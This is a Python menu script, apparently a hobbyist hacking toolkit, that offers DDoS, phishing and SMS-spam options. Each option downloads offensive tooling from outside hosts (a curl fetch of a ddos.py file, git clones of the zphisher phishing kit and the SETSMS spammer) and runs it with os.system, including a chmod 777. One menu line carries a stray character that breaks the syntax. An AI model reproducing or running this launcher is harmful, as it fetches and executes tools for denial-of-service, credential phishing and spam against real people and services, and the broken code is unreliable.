from colors import green, red, blue, yellow, purple, white

import os, time

#   <--Menu-->

red()

banner = """


:::::::::   ::::::::  :::::::::  
:+:    :+: :+:    :+: :+:    :+: 
+:+    +:+ +:+    +:+ +:+    +:+ 
+#++:++#+  +#+    +:+ +#++:++#+  
+#+    +#+ +#+    +#+ +#+    +#+ 
#+#    #+# #+#    #+# #+#    #+# 
#########   ########  #########                                                 
"""

def decoracion():
    purple()
    # hola
    print("              |                    1 -->> DDos")
    print("              |                    2 -->> Phishing")
    print("              |                    3 -->> Spam SMS")                               |              
    print("              |                    99 -->> Exit")    
    option = input("              +-> ")

    if option == "1":
        ddos()

    if option == "2":
        phishing()

    if option == "3":
        sms()

    if option == "99":
        os.system("clear")
        exit()

#   <--Return to Menu-->
def start_menu():
    os.system("clear")
    red()
    print(banner)
    purple()
    decoracion()


#<--DDoS-->
def ddos():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        yellow()
        print("")
        print("Downloading...")
        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
        red()
        print("Downloaded!!")
        time.sleep(2)
        while True:
            ddos()

    if x == "2":
        print("")
        os.system("python3 ddos.py")

    if x == "3":
        start_menu()

#<--Phishing with zphisher-->
def phishing():
    os.system("clear")

    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        
        yellow()
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()

    if x == "2":
        print("")
        os.system("mv zphisher/* .")
        os.system("mv zphisher/.sites .")
        os.system("bash zphisher.sh")

    if x == "3":
        start_menu()


def sms():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/Darkmux/SETSMS")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            sms()

    if option == "2":
        os.system("mv SETSMS/* .")
        os.system("chmod 777 SETSMS.sh")
        os.system("bash SETSMS.sh")

    if option == "3":
        start_menu()

#    <---Start the tool-->
start_menu()
